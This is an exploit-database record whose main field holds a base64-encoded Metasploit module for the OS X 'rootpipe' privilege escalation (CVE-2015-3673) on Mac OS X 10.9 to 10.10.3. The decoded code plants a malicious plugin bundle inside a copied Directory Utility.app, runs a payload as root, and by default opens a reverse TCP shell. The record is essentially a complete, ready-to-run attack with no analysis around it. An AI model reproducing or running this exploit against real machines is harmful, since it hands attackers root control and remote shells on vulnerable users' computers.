{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDQgPCBNc2Y6OkV4cGxvaXQ6OkxvY2FsDQoNCiAgUmFuayA9IEdyZWF0UmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpPU1g6OlN5c3RlbQ0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpGaWxlRHJvcHBlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICA9PiAnQXBwbGUgT1MgWCBFbnRpdGxlbWVudHMgUm9vdHBpcGUgUHJpdmlsZWdlIEVzY2FsYXRpb24nLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgdGhlIHJvb3RwaXBlIHZ1bG5lcmFiaWxpdHkgYW5kIGJ5cGFzc2VzIEFwcGxlJ3MgaW5pdGlhbA0KICAgICAgICBmaXggZm9yIHRoZSBpc3N1ZSBieSBpbmplY3RpbmcgY29kZSBpbnRvIGEgcHJvY2VzcyB3aXRoIHRoZSAnYWRtaW4ud3JpdGVjb25maWcnDQogICAgICAgIGVudGl0bGVtZW50Lg0KICAgICAgfSwNCiAgICAgICdBdXRob3InICAgICAgICAgPT4gWw0KICAgICAgICAnRW1pbCBLdmFybmhhbW1hcicsICMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcnkgYW5kIFBvQw0KICAgICAgICAnam9ldicgICAgICAgICAgICAgICMgQ29weS9wYXN0ZSBtb25rZXkNCiAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+IFsNCiAgICAgICAgWydDVkUnLCAgICcyMDE1LTM2NzMnXSwNCiAgICAgICAgWydVUkwnLCAgICdodHRwczovL3RydWVzZWNkZXYud29yZHByZXNzLmNvbS8yMDE1LzA3LzAxL2V4cGxvaXRpbmctcm9vdHBpcGUtYWdhaW4vJ10NCiAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdKdWwgMSAyMDE1JywNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnUGxhdGZvcm0nICAgICAgID0+ICdvc3gnLA0KICAgICAgJ0FyY2gnICAgICAgICAgICA9PiBBUkNIX1g4Nl82NCwNCiAgICAgICdTZXNzaW9uVHlwZXMnICAgPT4gWydzaGVsbCddLA0KICAgICAgJ1ByaXZpbGVnZWQnICAgICA9PiB0cnVlLA0KICAgICAgJ1RhcmdldHMnICAgICAgICA9PiBbDQogICAgICAgIFsnTWFjIE9TIFggMTAuOS0xMC4xMC4zJywge31dDQogICAgICBdLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwLA0KICAgICAgJ0RlZmF1bHRPcHRpb25zJyA9PiB7DQogICAgICAgICdQQVlMT0FEJyAgICAgICAgID0+ICdvc3gveDY0L3NoZWxsX3JldmVyc2VfdGNwJywNCiAgICAgICAgJ1ByZXBlbmRTZXRyZXVpZCcgPT4gdHJ1ZQ0KICAgICAgfQ0KICAgICkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKFsNCiAgICAgIE9wdFN0cmluZy5uZXcoJ1dSSVRBQkxFRElSJywgW3RydWUsICdXcml0YWJsZSBkaXJlY3RvcnknLCAnLy5UcmFzaGVzJ10pDQogICAgXSkNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgaWYgdmVyPyAmJiBhZG1pbj8NCiAgICAgIHZwcmludF9zdGF0dXMoIlZlcnNpb24gaXMgYmV0d2VlbiAxMC45IGFuZCAxMC4xMC4zLCBhbmQgaXMgYWRtaW4uIikNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlZ1bG5lcmFibGUNCiAgICBlbHNlDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgcHJpbnRfc3RhdHVzKCJDb3B5aW5nIERpcmVjdG9yeSBVdGlsaXR5LmFwcCB0byAje25ld19hcHB9IikNCiAgICBjbWRfZXhlYygiY3AgLVIgJy9TeXN0ZW0vTGlicmFyeS9Db3JlU2VydmljZXMvQXBwbGljYXRpb25zL0RpcmVjdG9yeSBVdGlsaXR5LmFwcCcgJyN7bmV3X2FwcH0nIikNCiAgICBjbWRfZXhlYygibWtkaXIgLXAgJyN7bmV3X2FwcH0vQ29udGVudHMvUGx1Z0lucy9Sb290cGlwZUJ1bmRsZS5kYXBsdWcvQ29udGVudHMvTWFjT1MnIikNCg0KICAgIHByaW50X3N0YXR1cygiV3JpdGluZyBidW5kbGUgcGxpc3QgdG8gYCN7cGxpc3RfZmlsZX0nIikNCiAgICB3cml0ZV9maWxlKHBsaXN0X2ZpbGUsIHBsaXN0KQ0KDQogICAgcHJpbnRfc3RhdHVzKCJXcml0aW5nIHBheWxvYWQgdG8gYCN7cGF5bG9hZF9maWxlfSciKQ0KICAgIHdyaXRlX2ZpbGUocGF5bG9hZF9maWxlLCBiaW5hcnlfcGF5bG9hZCkNCiAgICByZWdpc3Rlcl9maWxlX2Zvcl9jbGVhbnVwKHBheWxvYWRfZmlsZSkNCg0KICAgIHByaW50X3N0YXR1cygiV3JpdGluZyBtYWxpY2lvdXMgc2hhcmVkIGxpYnJhcnkgdG8gYCN7ZXhwbG9pdF9maWxlfSciKQ0KICAgIHdyaXRlX2ZpbGUoZXhwbG9pdF9maWxlLCBwbHVnaW5fZXhwbG9pdCkNCg0KICAgIHByaW50X3N0YXR1cygiUnVubmluZyBEaXJlY3RvcnkgVXRpbGl0eS5hcHAiKQ0KICAgIGNtZF9leGVjKCIvYmluL3NoIC1jICdQQVlMT0FEX0lOPSIrcGF5bG9hZF9maWxlKyIgUEFZTE9BRF9PVVQ9Iityb290X2ZpbGUrIiAje25ld19hcHB9L0NvbnRlbnRzL01hY09TL0RpcmVjdG9yeVxcIFV0aWxpdHknIikNCg0KICAgIHByaW50X3N0YXR1cygiRGVsZXRpbmcgRGlyZWN0b3J5IFV0aWxpdHkuYXBwIikNCiAgICBjbWRfZXhlYygncm0gLVJmICIje25ld19hcHB9IicpDQoNCiAgICBwcmludF9zdGF0dXMoJ0V4ZWN1dGluZyBwYXlsb2FkLi4uJykNCiAgICBjbWRfZXhlYygiL2Jpbi9zaCAtYyAnI3tyb290X2ZpbGV9ICYnIikNCiAgZW5kDQoNCiAgZGVmIHZlcj8NCiAgICBHZW06OlZlcnNpb24ubmV3KGdldF9zeXNpbmZvWydQcm9kdWN0VmVyc2lvbiddKS5iZXR3ZWVuPygNCiAgICAgIEdlbTo6VmVyc2lvbi5uZXcoJzEwLjknKSwgR2VtOjpWZXJzaW9uLm5ldygnMTAuMTAuMycpDQogICAgKQ0KICBlbmQNCg0KICBkZWYgYWRtaW4/DQogICAgY21kX2V4ZWMoJ2dyb3VwcyB8IGdyZXAgLXdxIGFkbWluICYmIGVjaG8gdHJ1ZScpID09ICd0cnVlJw0KICBlbmQNCg0KICBkZWYgc3Bsb2l0DQogICAgIiN7ZGF0YXN0b3JlWydQWVRIT04nXX0gI3tleHBsb2l0X2ZpbGV9ICN7cGF5bG9hZF9maWxlfSAje3BheWxvYWRfZmlsZX0iDQogIGVuZA0KDQogIGRlZiBwbHVnaW5fZXhwbG9pdA0KICAgIEZpbGUucmVhZChGaWxlLmpvaW4oDQogICAgICBNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE1LTM2NzMnLCAnZXhwbG9pdC5kYXBsdWcnDQogICAgKSkNCiAgZW5kDQoNCiAgZGVmIGJpbmFyeV9wYXlsb2FkDQogICAgTXNmOjpVdGlsOjpFWEUudG9fb3N4X3g2NF9tYWNobyhmcmFtZXdvcmssIHBheWxvYWQuZW5jb2RlZCkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXRfZmlsZQ0KICAgICIje25ld19hcHB9L0NvbnRlbnRzL1BsdWdJbnMvUm9vdHBpcGVCdW5kbGUuZGFwbHVnL0NvbnRlbnRzL01hY09TL1Jvb3RwaXBlQnVuZGxlIg0KICBlbmQNCg0KICBkZWYgcGxpc3RfZmlsZQ0KICAgICIje25ld19hcHB9L0NvbnRlbnRzL1BsdWdJbnMvUm9vdHBpcGVCdW5kbGUuZGFwbHVnL0NvbnRlbnRzL0luZm8ucGxpc3QiDQogIGVuZA0KDQogIGRlZiBuZXdfYXBwDQogICAgQGFwcCB8fD0gIiN7ZGF0YXN0b3JlWydXUklUQUJMRURJUiddfS8je1JleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoOCl9LmFwcCINCiAgZW5kDQoNCiAgZGVmIHBsaXN0DQogICAgJVF8DQogICAgICA8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/Pg0KICAgICAgPHBsaXN0IHZlcnNpb249IjEuMCI+DQogICAgICA8ZGljdD4NCiAgICAgICAgPGtleT5DRkJ1bmRsZUdldEluZm9TdHJpbmc8L2tleT4NCiAgICAgICAgPHN0cmluZz5Sb290cGlwZUJ1bmRsZTwvc3RyaW5nPg0KICAgICAgICA8a2V5PkNGQnVuZGxlRXhlY3V0YWJsZTwva2V5Pg0KICAgICAgICA8c3RyaW5nPlJvb3RwaXBlQnVuZGxlPC9zdHJpbmc+DQogICAgICAgIDxrZXk+Q0ZCdW5kbGVJZGVudGlmaWVyPC9rZXk+DQogICAgICAgIDxzdHJpbmc+Y29tLnJvb3QucGlwZTwvc3RyaW5nPg0KICAgICAgICA8a2V5PkNGQnVuZGxlTmFtZTwva2V5Pg0KICAgICAgICA8c3RyaW5nPlJvb3RwaXBlQnVuZGxlPC9zdHJpbmc+DQogICAgICAgIDxrZXk+Q0ZCdW5kbGVTaG9ydFZlcnNpb25TdHJpbmc8L2tleT4NCiAgICAgICAgPHN0cmluZz4wLjAxPC9zdHJpbmc+DQogICAgICAgIDxrZXk+Q0ZCdW5kbGVJbmZvRGljdGlvbmFyeVZlcnNpb248L2tleT4NCiAgICAgICAgPHN0cmluZz42LjA8L3N0cmluZz4NCiAgICAgICAgPGtleT5DRkJ1bmRsZVBhY2thZ2VUeXBlPC9rZXk+DQogICAgICAgIDxzdHJpbmc+QVBQTDwvc3RyaW5nPg0KICAgICAgICA8a2V5PklGTWFqb3JWZXJzaW9uPC9rZXk+DQogICAgICAgIDxpbnRlZ2VyPjA8L2ludGVnZXI+DQogICAgICAgIDxrZXk+SUZNaW5vclZlcnNpb248L2tleT4NCiAgICAgICAgPGludGVnZXI+MTwvaW50ZWdlcj4NCiAgICAgIDwvZGljdD4NCiAgICAgIDwvcGxpc3Q+DQogICAgfA0KICBlbmQNCg0KICBkZWYgcGF5bG9hZF9maWxlDQogICAgQHBheWxvYWRfZmlsZSB8fD0NCiAgICAgICIje2RhdGFzdG9yZVsnV1JJVEFCTEVESVInXX0vI3tSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDgpfSINCiAgZW5kDQoNCiAgZGVmIHJvb3RfZmlsZQ0KICAgIEByb290X2ZpbGUgfHw9DQogICAgICAiI3tkYXRhc3RvcmVbJ1dSSVRBQkxFRElSJ119LyN7UmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYSg4KX0iDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/osx/local/38036.rb", 
    "id": "38036", 
    "cves": [
        "CVE-2015-3673"
    ]
}